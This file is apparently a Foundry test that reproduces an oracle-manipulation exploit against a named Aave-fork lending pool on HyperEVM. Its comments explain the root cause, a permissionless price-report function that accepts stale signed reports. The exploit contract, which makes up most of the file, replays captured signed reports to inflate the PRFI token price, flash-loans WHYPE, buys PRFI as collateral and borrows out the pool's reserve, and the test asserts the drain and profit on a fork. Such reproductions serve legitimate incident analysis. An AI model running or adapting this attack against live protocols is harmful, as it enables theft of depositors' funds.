// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Prime (PRFI) oracle-manipulation exploit - HyperEVM (chain id 999), 2026-09-18.
//
// Loss: 425.52 WHYPE borrowed out of the lending pool's WHYPE reserve; attacker nets ~398.70
// WHYPE after repaying a 100 WHYPE Morpho flash loan and paying 26.82 WHYPE to buy PRFI.
//
// On-chain references (HyperEVM):
//   exploit tx        : 0xff990876d863a61732779c341991215856c89420b84daaf31eece7ecd5ff4243
//   block             : 46060987 (fork at parent 46060986)
//   attacker EOA      : 0x19bc1c7fD4Aa93F540498499b8f5B4FC3DDE5A52
//   attacker contract : 0x817D33738D979eD899ff2f6e9332246a2F2a6Da1 (deployed + self-called in-tx)
//
// Actors / contracts (all pulled from the exploit tx trace):
//   DataStreamConsumer (oracle) : 0x04EDBF3904789d80B0C991e0B66577F2208A2bE6
//   Chainlink Verifier proxy    : 0x60faa7fac949af392dfc858f5d97e3eefa07e9eb
//   Chainlink Verifier          : 0xf45d6dba93d0db2c849c280f45e60d6e11b3c4dd
//   Lending pool (victim, Aave-fork) : 0xb339448E13E273f6F46e3390e0932Ab7fF9F113F
//   aWHYPE (WHYPE reserve holder)    : 0xCF4642EF89683D0299B59738b1Cc3AC0177348Ba
//   Morpho Blue (flash source)  : 0x68e37dE8d93d3496ae143F2E900490f6280C57cD
//   WHYPE/PRFI UniV2 pool       : 0x981F145a71Da6DF4A7cBe892807782c9CC9a5515
//                                 token0 = WHYPE, token1 = PRFI (both 18 dec)
//   WHYPE : 0x5555555555555555555555555555555555555555
//   PRFI  : 0x7BBCf1B600565AE023a1806ef637Af4739dE3255
//
// ROOT CAUSE (confirmed on-chain, not from documentation):
//   DataStreamConsumer.verifyReport(bytes) [selector 0x1af189a4] is permissionless. It forwards
//   the report to the Chainlink Verifier proxy (verify(bytes,bytes)), which does the real DON
//   threshold-signature check (six ecrecover calls on the 0x01 precompile in the trace), then
//   stores the returned price for the feed. It never checks that the report's round/timestamp is
//   newer than what is already stored for that feed, so any validly-signed-but-stale report
//   overwrites the live price.
//
//   Confirmed permissionless directly against the deployed contract at the parent block: calling
//   verifyReport with each captured report from an arbitrary address (0x1111...1111), holding no
//   role and sending no value, returns success (0x). The contract is Ownable, but ownership only
//   gates config setters - not verifyReport. The attacker's own freshly-deployed contract calling
//   it in the real tx is the same proof.
//
//   The two reports below are the exact DON-signed payloads the attacker passed, captured from the
//   tx trace. Replaying them through the real Verifier (no faked storage writes) pushes the PRFI
//   feed to ~$0.1101 (real PRFI ~ $0.0021, a ~52x inflation) and refreshes the WHYPE feed.
//
//   With PRFI over-valued, the attacker flash-loans 100 WHYPE from Morpho, buys 795,587 PRFI off
//   the thin pool for 26.82 WHYPE, supplies the PRFI as collateral, and borrows 425.52 WHYPE
//   against it - draining the reserve - then repays the flash loan.
//
// Run:
//   forge test --contracts src/test/2026-09/PrimeFinance_exp.sol -vvv
//
// RPC NOTE (flagging, not editing foundry.toml): there is no `hyperevm` alias in [rpc_endpoints],
// so the fork uses an explicit HyperEVM URL. It MUST be an archival endpoint. The public
// https://rpc.hyperliquid.xyz/evm serves current storage even for a historical --block, so the
// lending pool's reserve carries a future lastUpdateTimestamp and Aave's interest-index math
// underflows (MathError) on deposit. https://hyperliquid.drpc.org returns true historical state
// and is used here; rpc.hyperlend.finance and rpc.purroofgroup.com also work. If a `hyperevm`
// alias is added later, point it at an archival node.

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IDataStreamConsumer {
    function verifyReport(bytes calldata payload) external;
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

interface IUniV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IAaveV3Pool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
}

contract PrimeFinanceExploit {
    IMorpho constant MORPHO = IMorpho(0x68e37dE8d93d3496ae143F2E900490f6280C57cD);
    IDataStreamConsumer constant CONSUMER = IDataStreamConsumer(0x04EDBF3904789d80B0C991e0B66577F2208A2bE6);
    IAaveV3Pool constant LENDING = IAaveV3Pool(0xb339448E13E273f6F46e3390e0932Ab7fF9F113F);
    IUniV2Pair constant POOL = IUniV2Pair(0x981F145a71Da6DF4A7cBe892807782c9CC9a5515);
    IERC20 constant WHYPE = IERC20(0x5555555555555555555555555555555555555555);
    IERC20 constant PRFI = IERC20(0x7BBCf1B600565AE023a1806ef637Af4739dE3255);

    uint256 constant FLASH = 100e18;
    // WHYPE spent buying PRFI. The real tx moved 26.82 WHYPE through the pool via HyperswapPair's
    // own (non-constant-product) accounting; a plain constant-product buy needs slightly more WHYPE
    // to acquire the same ~795,587 PRFI of collateral, so this is sized to match that collateral.
    uint256 constant SWAP_IN = 28.5e18;
    uint256 constant BORROW = 425_521_620_381_705_945_356; // WHYPE borrowed out of the reserve (the drain)

    // Genuine DON-signed Chainlink Data Streams reports, captured from the exploit tx trace.
    bytes constant REPORT_1 = hex"00094baebfda9b87680d8e59aa20a3e565126640ee7caeab3cd965e5568b17ee00000000000000000000000000000000000000000000000000000000010f8bd0000000000000000000000000000000000000000000000000000000040000000100000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000001e000000000000000000000000000000000000000000000000000000000000002c0010101000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e00002dec7106df74b537116b4810113452c0e457fdac43d250482897057be233b0000000000000000000000000000000000000000000000000000000068deda080000000000000000000000000000000000000000000000000000000068deda08000000000000000000000000000000000000000000000000000040c57dc72e5d0000000000000000000000000000000000000000000000000031942cdafd2910000000000000000000000000000000000000000000000000000000006906670800000000000000000000000000000000000000000000000001874682407106ec0000000000000000000000000000000000000000000000000000000000000006f243b73ce4aa06f9b08cce8d99cb47a26688a55d0145f291e4e182f0d67437da37ae749e9c9b8ae389dc35f8ce4579d59b10ca018b7a1c295e24a8fb215460197c29c8ab56e783ba834c7d5f19f6cf57e6129703f147d92b0a02e7076bac94e9bfebdf994072f4dd576968c14511642a36bf91204800f74697d458caf5710f1975105b097fdfd8f8f958518d7eee8db08c0bf822a30021273fefc34bce52506ee7ffd60f89afee1c362d550ce5b466ae812debed4eefaf8257416fe3c75726e100000000000000000000000000000000000000000000000000000000000000063e3a0d9af78b0b433edb60d315dc62e355eaec771df946a2ff1dbff257bd26a51527b12e12df214c4e4c51067f1cca60fe5471f4e6208839f27e0d8482748131578fa70e2334de265c9ede54e79ca876a9f1a14931f30cec050e58453527249b325cad76d403bef4225c158586a97002bc1c8205a6ab84dab64eb352847830e751dceed3a5467ca5deed039a7f266184b16b1596ae3cf8cb790fc9fff848e27d723f91b2d371cff7d18955f4e5a924f516b4350bd4bf8ccf08749f6ce4296447";
    bytes constant REPORT_2 = hex"00094baebfda9b87680d8e59aa20a3e565126640ee7caeab3cd965e5568b17ee0000000000000000000000000000000000000000000000000000000001d934a0000000000000000000000000000000000000000000000000000000040000000100000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000002200000000000000000000000000000000000000000000000000000000000000300010100010001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001200003d34539af562867c3cb309b59efccf40e74b404fb415eeb7699d61322aed9000000000000000000000000000000000000000000000000000000006970b1de000000000000000000000000000000000000000000000000000000006970b1de00000000000000000000000000000000000000000000000000006266e141db92000000000000000000000000000000000000000000000000005cca3827a0f12a0000000000000000000000000000000000000000000000000000000069983ede0000000000000000000000000000000000000000000000011dc3db5476ea50780000000000000000000000000000000000000000000000011dbaab84fe5955800000000000000000000000000000000000000000000000011dce37b7798958a000000000000000000000000000000000000000000000000000000000000000068e4d24de355db85db31a70c005ef7b788af2dfeab26b7ddb0938cebe9b2eed679764960d0aed87b00aeb30a9d1571de1e9497470c2372914138f82f1fcc63c111e7c948be44e5f0847ffaf9c88f8c85c1b6f76a49ea8cdcbb2c64ed4b7dbe329afe2ea322110a30a408aa11ffe16df84ac05fd5e58d053a6dd45acecb1ffa97e9598e8ac0e910975605e22920925e116a2f2e90263ddba75f32792fa46ba25e326a70912c493e011e6919c2ed17f3d09ba249162b26ee1730c5af361b258d5e3000000000000000000000000000000000000000000000000000000000000000650cf96cb118daecc299f195b69b1512f1b138ab6b553841102a0e9455d886cc015602b58cd2e33b6663477a79d5ba553d2ddf9efb65261b71e8949e3d648be3a2ea31cd8d8d1b466b8a111f79ead4d8caf4139aa7bf02fddb48e2537f627d9a703cc512f6b6def88f82f78d158c45952f44125e1b518669c7ebc8beda82d14dd2aa9e295032a2778ed20d4039dae8a25a1fde8e82fa759686c4094984bd79b26603cff27665fe63eea36068a64a34b6468d65477cfb654f19a807590e7a8849e";

    address immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function run() external {
        MORPHO.flashLoan(address(WHYPE), FLASH, "");
        WHYPE.transfer(owner, WHYPE.balanceOf(address(this))); // sweep proceeds to the test contract
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MORPHO), "only morpho");

        // 1) Push the signed reports through the permissionless consumer -> inflates PRFI price.
        CONSUMER.verifyReport(REPORT_1);
        CONSUMER.verifyReport(REPORT_2);

        // 2) Buy PRFI cheap off the thin pool (direct-transfer + low-level UniV2 swap).
        (uint112 r0, uint112 r1,) = POOL.getReserves(); // token0 = WHYPE, token1 = PRFI
        uint256 amtInWithFee = SWAP_IN * 997;
        uint256 prfiOut = (amtInWithFee * r1) / (uint256(r0) * 1000 + amtInWithFee);
        WHYPE.transfer(address(POOL), SWAP_IN);
        POOL.swap(0, prfiOut, address(this), "");

        // 3) Supply the over-valued PRFI as collateral, borrow WHYPE against it.
        uint256 prfiBal = PRFI.balanceOf(address(this));
        PRFI.approve(address(LENDING), type(uint256).max);
        LENDING.deposit(address(PRFI), prfiBal, address(this), 0);
        LENDING.borrow(address(WHYPE), BORROW, 2, 0, address(this));

        // 4) Repay the Morpho flash loan (Morpho pulls `assets` back via transferFrom).
        WHYPE.approve(address(MORPHO), assets);
    }
}

contract PrimeFinanceExp is BaseTestWithBalanceLog {
    IERC20 constant WHYPE = IERC20(0x5555555555555555555555555555555555555555);
    address constant AWHYPE = 0xCF4642EF89683D0299B59738b1Cc3AC0177348Ba; // holds the WHYPE reserve

    function setUp() public {
        // Fork at the parent of the exploit block (46060987).
        vm.createSelectFork("https://hyperliquid.drpc.org", 46_060_986);
        fundingToken = address(WHYPE); // log/measure profit in WHYPE
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public balanceLog {
        uint256 reserveBefore = WHYPE.balanceOf(AWHYPE);

        PrimeFinanceExploit exploit = new PrimeFinanceExploit();
        exploit.run();

        uint256 reserveAfter = WHYPE.balanceOf(AWHYPE);
        uint256 drained = reserveBefore - reserveAfter;
        uint256 profit = WHYPE.balanceOf(address(this));

        emit log_named_decimal_uint("WHYPE drained from reserve", drained, 18);
        emit log_named_decimal_uint("WHYPE net profit to attacker", profit, 18);

        // Reserve drain matches the on-chain borrow of 425.52 WHYPE (~$33.4K) to the wei.
        assertApproxEqAbs(drained, 425_521_620_381_705_945_356, 0.01e18, "reserve drain != ~425.52 WHYPE");
        // Net profit ~397.02 WHYPE. The real attacker netted ~398.70; the ~1.68 WHYPE gap is the
        // extra WHYPE a plain constant-product buy costs to acquire the same PRFI collateral vs
        // HyperswapPair's own (non-constant-product) swap accounting. The drain above is exact.
        assertGt(profit, 395e18, "profit not material");
        assertLt(profit, 399e18, "profit above real");
    }
}
